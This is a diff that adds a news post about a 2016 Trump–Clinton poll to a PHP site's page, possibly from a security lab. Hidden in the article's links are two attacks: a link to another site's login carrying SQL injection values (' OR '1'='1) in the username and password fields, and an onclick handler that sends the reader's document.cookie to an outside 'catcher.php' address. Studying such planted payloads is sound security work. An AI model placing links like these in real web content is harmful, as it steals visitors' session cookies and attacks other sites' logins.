@@ -11,6 +11,30 @@ include 'header.php';
 	  
     	  
     <!-- headline -->    
+     <h2> <a href="/featured/20160915-tight-race-trump-clinton.php">Poll Shows Tight Race for Donald Trump and Hillary Clinton</a></h2>
+       
+  <p class="details">By GIOVANNI RUSSONELLO SEPT.15, 2016 <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="/images/trumpclinton.png"  alt="trumpclinton" /></a></div>
+       
+<p>
+With less than <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">eight weeks </a> before Election Day, Donald J. Trump and Hillary Clinton are locked in a tight contest, with both candidates still struggling to win the confidence of their <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">respective bases,</a> the latest New York Times/CBS News poll finds.
+</p> 
+
+<p class="readmore">[ <a href="/featured/20160915-tight-race-trump-clinton.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
      <h2> <a href="/featured/20160914-bengaluru-protest.php">Bengaluru protests have cost Karnataka over Rs 25,000 crore; public transport worst-hit</a></h2>
        
   <p class="details">Sep 14, 2016 12:57 IST<a href="#"></a> </p>
